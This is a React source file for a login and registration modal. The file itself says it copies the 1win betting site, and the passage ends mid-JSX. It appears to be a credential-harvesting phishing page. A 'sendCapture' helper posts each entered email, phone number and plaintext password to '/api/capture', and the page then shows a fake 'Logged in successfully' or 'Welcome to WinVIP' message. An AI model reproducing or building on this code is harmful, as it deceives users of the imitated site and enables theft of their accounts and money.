'use client';

import React, { useState, useEffect, useMemo } from 'react';

export interface AuthModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialMode?: 'login' | 'register';
}

// --------------------------------------------------------------------------
// Currencies matching Image 2 & Reference
// --------------------------------------------------------------------------
export interface CurrencyItem {
  code: string;
  name: string;
  symbol: string;
  badgeBg: string;
  badgeColor?: string;
  badgeType: 'crypto' | 'fiat';
}

export const CURRENCIES: CurrencyItem[] = [
  { code: 'INR', name: 'Indian rupee', symbol: '₹', badgeBg: '#008236', badgeColor: '#fd5e00', badgeType: 'fiat' },
  { code: '1WIN', name: '1win Token', symbol: '1WIN', badgeBg: '#d7a13d', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BCH', name: 'Bitcoin Cash', symbol: 'BCH', badgeBg: '#0ac18e', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BNB', name: 'Binance coin', symbol: 'BNB', badgeBg: '#f3ba2f', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BTC', name: 'Bitcoin', symbol: 'BTC', badgeBg: '#f7931a', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'DASH', name: 'Dash', symbol: 'DASH', badgeBg: '#008de4', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'DOGE', name: 'Dogecoin', symbol: 'DOGE', badgeBg: '#c2a633', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'ETC', name: 'Ethereum Classic', symbol: 'ETC', badgeBg: '#1f1f1f', badgeColor: '#10b981', badgeType: 'crypto' },
  { code: 'ETH', name: 'Ethereum', symbol: 'ETH', badgeBg: '#627eea', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'HYPE', name: 'Hype', symbol: 'HYPE', badgeBg: '#0b3c37', badgeColor: '#00e5a3', badgeType: 'crypto' },
  { code: 'LINK', name: 'Chainlink', symbol: 'LINK', badgeBg: '#375bd2', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'LTC', name: 'Litecoin', symbol: 'LTC', badgeBg: '#bebebe', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'USD', name: 'US Dollar', symbol: '$', badgeBg: '#10b981', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'EUR', name: 'Euro', symbol: '€', badgeBg: '#2563eb', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'USDT', name: 'Tether (USDT)', symbol: '₮', badgeBg: '#26a17b', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'TRX', name: 'TRON', symbol: 'TRX', badgeBg: '#ef4444', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BDT', name: 'Bangladeshi Taka', symbol: '৳', badgeBg: '#059669', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'PKR', name: 'Pakistani Rupee', symbol: '₨', badgeBg: '#15803d', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'AED', name: 'UAE Dirham', symbol: 'د.إ', badgeBg: '#0d9488', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'RUB', name: 'Russian Ruble', symbol: '₽', badgeBg: '#3b82f6', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'BRL', name: 'Brazilian Real', symbol: 'R$', badgeBg: '#16a34a', badgeColor: '#ffffff', badgeType: 'fiat' },
];

// --------------------------------------------------------------------------
// Countries matching Image 3 & Reference
// --------------------------------------------------------------------------
export interface CountryItem {
  code: string;
  name: string;
  flag: string;
  searchStr: string;
}

export const COUNTRIES: CountryItem[] = [
  { code: '+91', name: 'India', flag: '🇮🇳', searchStr: 'india +91' },
  { code: '+7', name: 'Russia (Россия)', flag: '🇷🇺', searchStr: 'russia россия +7' },
  { code: '+380', name: 'Ukraine (Україна)', flag: '🇺🇦', searchStr: 'ukraine україна +380' },
  { code: '+355', name: 'Albania', flag: '🇦🇱', searchStr: 'albania +355' },
  { code: '+213', name: 'Algeria', flag: '🇩🇿', searchStr: 'algeria +213' },
  { code: '+1', name: 'American Samoa', flag: '🇦🇸', searchStr: 'american samoa +1' },
  { code: '+376', name: 'Andorra', flag: '🇦🇩', searchStr: 'andorra +376' },
  { code: '+244', name: 'Angola', flag: '🇦🇴', searchStr: 'angola +244' },
  { code: '+1264', name: 'Anguilla', flag: '🇦🇮', searchStr: 'anguilla +1264' },
  { code: '+1268', name: 'Antigua and Barbuda', flag: '🇦🇬', searchStr: 'antigua and barbuda +1268' },
  { code: '+54', name: 'Argentina', flag: '🇦🇷', searchStr: 'argentina +54' },
  { code: '+374', name: 'Armenia (Հայաստան)', flag: '🇦🇲', searchStr: 'armenia հայաստան +374' },
  { code: '+297', name: 'Aruba', flag: '🇦🇼', searchStr: 'aruba +297' },
  { code: '+61', name: 'Australia', flag: '🇦🇺', searchStr: 'australia +61' },
  { code: '+43', name: 'Austria', flag: '🇦🇹', searchStr: 'austria +43' },
  { code: '+994', name: 'Azerbaijan', flag: '🇦🇿', searchStr: 'azerbaijan +994' },
  { code: '+1242', name: 'Bahamas', flag: '🇧🇸', searchStr: 'bahamas +1242' },
  { code: '+973', name: 'Bahrain', flag: '🇧🇭', searchStr: 'bahrain +973' },
  { code: '+880', name: 'Bangladesh', flag: '🇧🇩', searchStr: 'bangladesh +880' },
  { code: '+375', name: 'Belarus', flag: '🇧🇾', searchStr: 'belarus +375' },
  { code: '+32', name: 'Belgium', flag: '🇧🇪', searchStr: 'belgium +32' },
  { code: '+55', name: 'Brazil', flag: '🇧🇷', searchStr: 'brazil +55' },
  { code: '+1', name: 'Canada', flag: '🇨🇦', searchStr: 'canada +1' },
  { code: '+86', name: 'China', flag: '🇨🇳', searchStr: 'china +86' },
  { code: '+20', name: 'Egypt', flag: '🇪🇬', searchStr: 'egypt +20' },
  { code: '+33', name: 'France', flag: '🇫🇷', searchStr: 'france +33' },
  { code: '+49', name: 'Germany', flag: '🇩🇪', searchStr: 'germany +49' },
  { code: '+62', name: 'Indonesia', flag: '🇮🇩', searchStr: 'indonesia +62' },
  { code: '+98', name: 'Iran', flag: '🇮🇷', searchStr: 'iran +98' },
  { code: '+964', name: 'Iraq', flag: '🇮🇶', searchStr: 'iraq +964' },
  { code: '+39', name: 'Italy', flag: '🇮🇹', searchStr: 'italy +39' },
  { code: '+81', name: 'Japan', flag: '🇯🇵', searchStr: 'japan +81' },
  { code: '+7', name: 'Kazakhstan', flag: '🇰🇿', searchStr: 'kazakhstan +7' },
  { code: '+254', name: 'Kenya', flag: '🇰🇪', searchStr: 'kenya +254' },
  { code: '+965', name: 'Kuwait', flag: '🇰🇼', searchStr: 'kuwait +965' },
  { code: '+60', name: 'Malaysia', flag: '🇲🇾', searchStr: 'malaysia +60' },
  { code: '+52', name: 'Mexico', flag: '🇲🇽', searchStr: 'mexico +52' },
  { code: '+977', name: 'Nepal', flag: '🇳🇵', searchStr: 'nepal +977' },
  { code: '+31', name: 'Netherlands', flag: '🇳🇱', searchStr: 'netherlands +31' },
  { code: '+234', name: 'Nigeria', flag: '🇳🇬', searchStr: 'nigeria +234' },
  { code: '+92', name: 'Pakistan', flag: '🇵🇰', searchStr: 'pakistan +92' },
  { code: '+63', name: 'Philippines', flag: '🇵🇭', searchStr: 'philippines +63' },
  { code: '+48', name: 'Poland', flag: '🇵🇱', searchStr: 'poland +48' },
  { code: '+974', name: 'Qatar', flag: '🇶🇦', searchStr: 'qatar +974' },
  { code: '+966', name: 'Saudi Arabia', flag: '🇸🇦', searchStr: 'saudi arabia +966' },
  { code: '+65', name: 'Singapore', flag: '🇸🇬', searchStr: 'singapore +65' },
  { code: '+27', name: 'South Africa', flag: '🇿🇦', searchStr: 'south africa +27' },
  { code: '+82', name: 'South Korea', flag: '🇰🇷', searchStr: 'south korea +82' },
  { code: '+34', name: 'Spain', flag: '🇪🇸', searchStr: 'spain +34' },
  { code: '+94', name: 'Sri Lanka', flag: '🇱🇰', searchStr: 'sri lanka +94' },
  { code: '+66', name: 'Thailand', flag: '🇹🇭', searchStr: 'thailand +66' },
  { code: '+90', name: 'Turkey', flag: '🇹🇷', searchStr: 'turkey +90' },
  { code: '+971', name: 'United Arab Emirates', flag: '🇦🇪', searchStr: 'united arab emirates uae +971' },
  { code: '+44', name: 'United Kingdom', flag: '🇬🇧', searchStr: 'united kingdom uk +44' },
  { code: '+1', name: 'United States', flag: '🇺🇸', searchStr: 'united states usa +1' },
  { code: '+998', name: 'Uzbekistan', flag: '🇺🇿', searchStr: 'uzbekistan +998' },
  { code: '+84', name: 'Vietnam', flag: '🇻🇳', searchStr: 'vietnam +84' },
];

// --------------------------------------------------------------------------
// Icons matching the reference image exactly
// --------------------------------------------------------------------------
function CloseIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#6c727f" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
      <line x1="18" y1="6" x2="6" y2="18" />
      <line x1="6" y1="6" x2="18" y2="18" />
    </svg>
  );
}

function ChevronDownIcon({ className = '' }: { className?: string }) {
  return (
    <svg className={className} width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#6c727f" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="6 9 12 15 18 9" />
    </svg>
  );
}

function SearchIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#6c727f" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="11" cy="11" r="8" />
      <line x1="21" y1="21" x2="16.65" y2="16.65" />
    </svg>
  );
}

function EnvelopeIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="#6c727f">
      <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
    </svg>
  );
}

function LockIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="#6c727f">
      <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
    </svg>
  );
}

// --------------------------------------------------------------------------
// Currency Badge: Dark green circle with orange Rupee ₹
// --------------------------------------------------------------------------
function CurrencyBadge({ currency, size = 26 }: { currency: CurrencyItem; size?: number }) {
  const iconSize = size;
  const isINR = currency.code === 'INR';
  const is1win = currency.code === '1WIN';
  const isEth = currency.code === 'ETH' || currency.code === 'ETC';
  const isBtc = currency.code === 'BTC';
  const isBch = currency.code === 'BCH';
  const isBnb = currency.code === 'BNB';
  const isDoge = currency.code === 'DOGE';
  const isDash = currency.code === 'DASH';
  const isLink = currency.code === 'LINK';
  const isHype = currency.code === 'HYPE';

  return (
    <div
      style={{
        width: `${iconSize}px`,
        height: `${iconSize}px`,
        borderRadius: isLink ? '6px' : '50%',
        backgroundColor: currency.badgeBg,
        color: currency.badgeColor || '#ffffff',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        flexShrink: 0,
        fontWeight: 800,
        fontSize: isINR ? `${Math.round(iconSize * 0.52)}px` : `${Math.round(iconSize * 0.44)}px`,
      }}
    >
      {isINR ? (
        <span style={{ color: '#fd5e00', fontWeight: 900, lineHeight: 1 }}>₹</span>
      ) : is1win ? (
        <span style={{ fontSize: '10px', fontWeight: 800, letterSpacing: '-0.5px' }}>1w</span>
      ) : isEth ? (
        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 1.5l-6.5 10.75 6.5 3.75 6.5-3.75L12 1.5zM5.5 13.5L12 22.5l6.5-9L12 16.5l-6.5-3z" />
        </svg>
      ) : isBtc ? (
        <span>₿</span>
      ) : isBch ? (
        <span style={{ transform: 'rotate(-12deg)' }}>₿</span>
      ) : isBnb ? (
        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 2l3 3-5 5-3-3 5-5zm5 5l3 3-3 3-3-3 3-3zM7 7l3 3-3 3-3-3 3-3zm5 5l3 3-3 3-3-3 3-3zm0 7l3 3-5 5-3-3 5-5z" />
        </svg>
      ) : isDoge ? (
        <span>Ð</span>
      ) : isDash ? (
        <span style={{ fontStyle: 'italic', fontWeight: 900 }}>D</span>
      ) : isLink ? (
        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 2L4 6.5v11L12 22l8-4.5v-11L12 2zm0 3.4l5 2.8v5.6l-5 2.8-5-2.8V8.2l5-2.8z" />
        </svg>
      ) : isHype ? (
        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
          <circle cx="8" cy="12" r="3" />
          <circle cx="16" cy="12" r="3" />
        </svg>
      ) : (
        <span>{currency.symbol}</span>
      )}
    </div>
  );
}

// --------------------------------------------------------------------------
// Icons matching the reference image exactly
// --------------------------------------------------------------------------
function PhoneTabIcon() {
  return (
    <svg width="17" height="17" viewBox="0 0 24 24" fill="currentColor" style={{ marginRight: '6px' }}>
      <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z" />
    </svg>
  );
}

function EmailTabIcon() {
  return (
    <svg width="17" height="17" viewBox="0 0 24 24" fill="currentColor" style={{ marginRight: '6px' }}>
      <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
    </svg>
  );
}

function GoogleIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="#111827">
      <path d="M21.35 11.1h-9.17v2.98h5.27c-.23 1.25-.94 2.31-2 3.02v2.51h3.24c1.89-1.74 2.98-4.3 2.98-7.38 0-.71-.06-1.4-.32-2.13z"/>
      <path d="M12.18 21c2.7 0 4.96-.9 6.62-2.43l-3.24-2.51c-.9.6-2.05.95-3.38.95-2.6 0-4.8-1.76-5.59-4.12H3.25v2.6C4.89 18.72 8.27 21 12.18 21z"/>
      <path d="M6.59 12.89c-.2-.6-.31-1.25-.31-1.89s.11-1.29.31-1.89V6.51H3.25C2.58 7.84 2.2 9.38 2.2 11s.38 3.16 1.05 4.49l3.34-2.6z"/>
      <path d="M12.18 4.96c1.47 0 2.79.51 3.83 1.5l2.87-2.87C17.14 1.95 14.88 1 12.18 1 8.27 1 4.89 3.28 3.25 6.51l3.34 2.6c.79-2.37 2.99-4.15 5.59-4.15z"/>
    </svg>
  );
}

function VkIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="#111827">
      <path d="M13.162 18.994c.609 0 .858-.406.851-.915-.072-1.554.686-2.08 1.439-1.397 1.135 1.031 1.488 1.936 2.684 2.217.141.033.287.05.435.05h3.048c.875 0 1.254-.44 1.002-1.272-.313-1.036-1.424-2.56-2.67-3.805-.679-.679-1.034-1.127-.29-2.146.012-.016 1.437-2.01 1.623-2.825.101-.444-.067-.775-.705-.775h-2.59c-.538 0-.786.286-.921.6-.286.666-.889 2.05-1.572 3.125-.79 1.244-1.164 1.464-1.583 1.218-.466-.273-.35-1.096-.35-1.681V8.623c0-.854-.251-1.242-.962-1.242-1.492 0-2.483.948-2.852 1.57-.156.264-.092.368.172.404.78.106.942.541.815 1.704-.082.748-.372 2.23-1.025 2.502-.454.189-.868-.216-1.536-1.503-.687-1.323-1.233-2.779-1.233-2.779s-.103-.255-.286-.393c-.22-.167-.532-.22-.532-.22L3.5 8.706c-.368 0-.505.172-.505.361 0 .34.436 2.016 2.032 4.254 1.066 1.494 2.568 3.327 4.606 4.646 1.054.682 2.378 1.027 3.529 1.027z"/>
    </svg>
  );
}

function TelegramIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="#111827">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.07-.2c-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.66-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.37-.49 1.02-.75 3.99-1.74 6.65-2.89 7.99-3.45 3.81-1.58 4.6-1.86 5.12-1.87.11 0 .37.03.53.17.14.12.18.28.2.45-.01.06.01.24 0 .38z" />
    </svg>
  );
}

function WebMoneyIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#111827" strokeWidth="2.8" strokeLinecap="round" strokeLinejoin="round">
      <path d="M4 10l4 5 4-5 4 5 4-5" />
    </svg>
  );
}

function YandexIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="#111827">
      <path d="M13.5 3H10c-3.3 0-5.5 2.2-5.5 5.5 0 2.2 1.1 4 3 4.9L4 21h3.5l3.5-7.5H12V21h3V3h-1.5zm-1.5 7.5H10c-1.7 0-2.5-1.1-2.5-2.5S8.3 5.5 10 5.5h2v5z"/>
    </svg>
  );
}

function WalletConnectIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="#111827">
      <path d="M5.5 8.5c3.6-3.5 9.4-3.5 13 0l.4.4c.2.2.2.5 0 .7l-1.5 1.5c-.1.1-.3.1-.4 0l-.6-.6c-2.6-2.5-6.8-2.5-9.4 0l-.6.6c-.1.1-.3.1-.4 0L4.5 9.6c-.2-.2-.2-.5 0-.7l1-.4zm15.7 3.1l1.4 1.4c.2.2.2.5 0 .7l-6.3 6.3c-.2.2-.5.2-.7 0l-3.6-3.6-3.6 3.6c-.2.2-.5.2-.7 0L1.4 13.7c-.2-.2-.2-.5 0-.7l1.4-1.4c.2-.2.5-.2.7 0l4.9 4.9 3.6-3.6c.2-.2.5-.2.7 0l3.6 3.6 4.9-4.9c.2-.2.5-.2.7 0z"/>
    </svg>
  );
}

function MetaMaskFoxIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="#111827">
      <path d="M21.5 4.3l-8.7 5.7 1.6-3.8 7.1-1.9zM2.5 4.3l7.1 1.9 1.6 3.8-8.7-5.7zm15.5 10.9l-2.7 4.1-5.3-2.3 4.4-1.7 3.6-.1zm-12 0l3.6.1 4.4 1.7-5.3 2.3-2.7-4.1zM9.3 12.3l-2.4 1.8 1.4-2.8 1 .9v.1zm5.4 0l1-.9 1.4 2.8-2.4-1.8v-.1zm-2.7 1.5l2.4-1 2.3 1.8-2.7 1.3-2-.1v-2zm0-4.6l1.8 2.2-1.8 1-1.8-1 1.8-2.2z"/>
    </svg>
  );
}

function ShieldIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24">
      <path d="M12 2L4 5v6.5C4 16.5 7.4 21.1 12 22c4.6-.9 8-5.5 8-10.5V5l-8-3z" stroke="#111827" strokeWidth="2" strokeLinejoin="round" fill="none"/>
      <path d="M12 3.2v17.6c-3.6-.9-6.4-4.7-6.4-9.1V5.7L12 3.2z" fill="#111827"/>
    </svg>
  );
}

// --------------------------------------------------------------------------
// Main Modal Component
// --------------------------------------------------------------------------
export default function AuthModal({ isOpen, onClose, initialMode = 'login' }: AuthModalProps) {
  const [authMode, setAuthMode] = useState<'login' | 'register'>(initialMode);
  const [subView, setSubView] = useState<'form' | 'currency' | 'country'>('form');

  // Login state: Email section opened by default
  const [loginSubTab, setLoginSubTab] = useState<'phone' | 'email'>('email');
  const [loginPhone, setLoginPhone] = useState('');
  const [loginPhoneCountry, setLoginPhoneCountry] = useState<CountryItem>(COUNTRIES[0]);
  const [loginPhoneErr, setLoginPhoneErr] = useState('');
  const [loginEmail, setLoginEmail] = useState('');
  const [loginEmailErr, setLoginEmailErr] = useState('');
  const [loginPwd, setLoginPwd] = useState('');
  const [loginPwdErr, setLoginPwdErr] = useState('');

  // Registration state
  const [regCurrency, setRegCurrency] = useState<CurrencyItem>(CURRENCIES[0]); // Default INR
  const [regCountry, setRegCountry] = useState<CountryItem>(COUNTRIES[0]); // Default India +91
  const [regPhone, setRegPhone] = useState('');
  const [regPhoneErr, setRegPhoneErr] = useState('');
  const [regEmail, setRegEmail] = useState('');
  const [regEmailErr, setRegEmailErr] = useState('');
  const [regPwd, setRegPwd] = useState('');
  const [regPwdErr, setRegPwdErr] = useState('');
  const [showPromo, setShowPromo] = useState(false);
  const [regPromo, setRegPromo] = useState('');
  const [regAgreed, setRegAgreed] = useState(true);
  const [regAgreedErr, setRegAgreedErr] = useState('');

  // Search states for pickers
  const [currencySearch, setCurrencySearch] = useState('');
  const [countrySearch, setCountrySearch] = useState('');

  // Submission / feedback state
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showError, setShowError] = useState(false);
  const [statusMessage, setStatusMessage] = useState('');

  // Sync initial mode and reset subtabs when modal opens or initialMode changes
  const [prevSyncState, setPrevSyncState] = useState({ isOpen, initialMode });
  if (prevSyncState.isOpen !== isOpen || prevSyncState.initialMode !== initialMode) {
    setPrevSyncState({ isOpen, initialMode });
    setAuthMode(initialMode);
    setLoginSubTab('email');
    setSubView('form');
  }

  // Lock body scroll when open
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = '';
    }
    return () => {
      document.body.style.overflow = '';
    };
  }, [isOpen]);

  const clearAllErrors = () => {
    setLoginPhoneErr('');
    setLoginEmailErr('');
    setLoginPwdErr('');
    setRegPhoneErr('');
    setRegEmailErr('');
    setRegPwdErr('');
    setRegAgreedErr('');
    setStatusMessage('');
  };

  const handleClose = React.useCallback(() => {
    clearAllErrors();
    setShowSuccess(false);
    setShowError(false);
    setIsSubmitting(false);
    setLoginSubTab('email');
    setSubView('form');
    onClose();
  }, [onClose]);

  // Close on Escape key
  useEffect(() => {
    const handleKey = (e: KeyboardEvent) => {
      if (e.key === 'Escape') {
        if (subView !== 'form') {
          setSubView('form');
        } else {
          handleClose();
        }
      }
    };
    document.addEventListener('keydown', handleKey);
    return () => document.removeEventListener('keydown', handleKey);
  }, [handleClose, subView]);

  // Filtered Currencies
  const filteredCurrencies = useMemo(() => {
    if (!currencySearch.trim()) return CURRENCIES;
    const q = currencySearch.toLowerCase().trim();
    return CURRENCIES.filter(
      (c) => c.name.toLowerCase().includes(q) || c.code.toLowerCase().includes(q) || c.symbol.toLowerCase().includes(q)
    );
  }, [currencySearch]);

  // Filtered Countries
  const filteredCountries = useMemo(() => {
    if (!countrySearch.trim()) return COUNTRIES;
    const q = countrySearch.toLowerCase().trim();
    return COUNTRIES.filter(
      (c) => c.searchStr.includes(q) || c.name.toLowerCase().includes(q) || c.code.includes(q)
    );
  }, [countrySearch]);

  // Phone sanitization
  const handlePhoneChange = (val: string, setter: (v: string) => void) => {
    const clean = val.replace(/[^\d\s]/g, '');
    setter(clean);
  };

  // Submit capture helper
  const sendCapture = async (data: Record<string, unknown>) => {
    setIsSubmitting(true);
    setShowSuccess(false);
    setShowError(false);

    try {
      const res = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, timestamp: new Date().toISOString() }),
      });
      setIsSubmitting(false);
      if (res.ok) {
        setShowSuccess(true);
        setStatusMessage(
          data.type === 'Registration'
            ? 'Account created successfully! Welcome to WinVIP.'
            : 'Logged in successfully.'
        );
      } else {
        setShowError(true);
      }
    } catch {
      setIsSubmitting(false);
      setShowError(true);
    }
  };

  // Handle Registration Submit
  const handleRegisterSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    clearAllErrors();
    let valid = true;

    const digits = regPhone.replace(/\D/g, '');
    if (!regPhone.trim()) {
      setRegPhoneErr('Please enter your phone number');
      valid = false;
    } else if (digits.length < 8) {
      setRegPhoneErr('Please enter a valid phone number');
      valid = false;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!regEmail.trim()) {
      setRegEmailErr('Please enter your email address');
      valid = false;
    } else if (!emailRegex.test(regEmail.trim())) {
      setRegEmailErr('Please enter a valid email address');
      valid = false;
    }

    if (!regPwd.trim()) {
      setRegPwdErr('Please enter a password');
      valid = false;
    } else if (regPwd.trim().length < 8) {
      setRegPwdErr('Password must be at least 8 characters');
      valid = false;
    }

    if (!regAgreed) {
      setRegAgreedErr('You must accept the User Agreement');
      valid = false;
    }

    if (!valid) return;

    await sendCapture({
      type: 'Registration',
      currency: regCurrency.code,
      currencyName: regCurrency.name,
      phone: `${regCountry.code} ${regPhone}`,
      email: regEmail,
      password: regPwd,
      promoCode: regPromo || undefined,
      agreedTerms: regAgreed,
    });
  };

  // Handle Login Submit
  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    clearAllErrors();
    let valid = true;

    if (loginSubTab === 'phone') {
      const digits = loginPhone.replace(/\D/g, '');
      if (!loginPhone.trim()) {
        setLoginPhoneErr('Please enter your phone number');
        valid = false;
      } else if (digits.length < 8) {
        setLoginPhoneErr('Please enter a valid phone number');
        valid = false;
      }
    } else {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!loginEmail.trim()) {
        setLoginEmailErr('Please enter your email address');
        valid = false;
      } else if (!emailRegex.test(loginEmail.trim())) {
        setLoginEmailErr('Please enter a valid email address');
        valid = false;
      }
    }

    if (!loginPwd.trim()) {
      setLoginPwdErr('Please enter your password');
      valid = false;
    } else if (loginPwd.trim().length < 6) {
      setLoginPwdErr('Password must be at least 6 characters');
      valid = false;
    }

    if (!valid) return;

    const isPhone = loginSubTab === 'phone';
    const cleanPhone = loginPhone.trim();
    const cleanEmail = loginEmail.trim();
    const phoneWithCode = isPhone ? `${loginPhoneCountry.code} ${cleanPhone}` : null;
    const emailVal = !isPhone ? cleanEmail : null;
    const identifierVal = isPhone ? phoneWithCode : emailVal;

    await sendCapture({
      type: 'Login',
      method: loginSubTab,
      identifier: identifierVal,
      email: emailVal,
      phone: phoneWithCode,
      password: loginPwd,
    });
  };

  if (!isOpen) return null;

  return (
    <div
      className="win-auth-overlay"
      onClick={(e) => {
        if (e.target === e.currentTarget) handleClose();
      }}
    >
      <div className="win-auth-sheet" role="dialog" aria-modal="true">
        {/* ===================================================================
            SUCCESS / ERROR OVERLAY
            =================================================================== */}
        {showSuccess ? (
          <div className="win-auth-card-body win-feedback-container">
            <div className="win-feedback-card win-feedback-success">
              <div className="win-feedback-icon">✓</div>
              <h3 className="win-feedback-title">{authMode === 'register' ? 'Account Created' : 'Welcome Back'}</h3>
              <p className="win-feedback-message">{statusMessage}</p>
              <button type="button" className="win-btn-submit" onClick={handleClose}>
                Continue
              </button>
            </div>
          </div>
        ) : showError ? (
          <div className="win-auth-card-body win-feedback-container">
            <div className="win-feedback-card win-feedback-error">
              <div className="win-feedback-icon win-feedback-icon-err">!</div>
              <h3 className="win-feedback-title" style={{ color: '#ef4444' }}>Network Error</h3>
              <p className="win-feedback-message">Unable to connect to server. Please try again.</p>
              <button type="button" className="win-btn-submit" onClick={() => setShowError(false)}>
                Try Again
              </button>
            </div>
          </div>
        ) : subView === 'currency' ? (
          /* ===================================================================
              VIEW: CHOOSE CURRENCY (Image 2)
              =================================================================== */
          <div className="win-subview-container">
            <div className="win-auth-header">
              <h2 className="win-auth-title">Choose currency</h2>
              <button
                type="button"
                className="win-auth-close-btn"
                aria-label="Back to registration"
                onClick={() => setSubView('form')}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="win-search-box">
              <span className="win-search-icon">
                <SearchIcon />
              </span>
              <input
                type="text"
                className="win-search-input"
                placeholder="Search"
                value={currencySearch}
                onChange={(e) => setCurrencySearch(e.target.value)}
                autoFocus
              />
            </div>

            <div className="win-picker-list">
              {filteredCurrencies.map((c) => {
                const isSelected = regCurrency.code === c.code;
                return (
                  <button
                    key={c.code}
                    type="button"
                    className={`win-currency-item${isSelected ? ' win-picker-item--active' : ''}`}
                    onClick={() => {
                      setRegCurrency(c);
                      setSubView('form');
                    }}
                  >
                    <CurrencyBadge currency={c} size={36} />
                    <div className="win-currency-info">
                      <span className="win-currency-name">{c.name}</span>
                      <span className="win-currency-code">{c.code}</span>
                    </div>
                  </button>
                );
              })}
              {filteredCurrencies.length === 0 && (
                <div className="win-picker-empty">No currencies found</div>
              )}
            </div>
          </div>
        ) : subView === 'country' ? (
          /* ===================================================================
              VIEW: CHOOSE COUNTRY (Image 3)
              =================================================================== */
          <div className="win-subview-container">
            <div className="win-auth-header">
              <h2 className="win-auth-title">Choose country</h2>
              <button
                type="button"
                className="win-auth-close-btn"
                aria-label="Back to registration"
                onClick={() => setSubView('form')}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="win-search-box">
              <span className="win-search-icon">
                <SearchIcon />
              </span>
              <input
                type="text"
                className="win-search-input"
                placeholder="Search"
                value={countrySearch}
                onChange={(e) => setCountrySearch(e.target.value)}
                autoFocus
              />
            </div>

            <div className="win-picker-list">
              {filteredCountries.map((country, idx) => {
                const isSelected =
                  authMode === 'register'
                    ? regCountry.code === country.code && regCountry.name === country.name
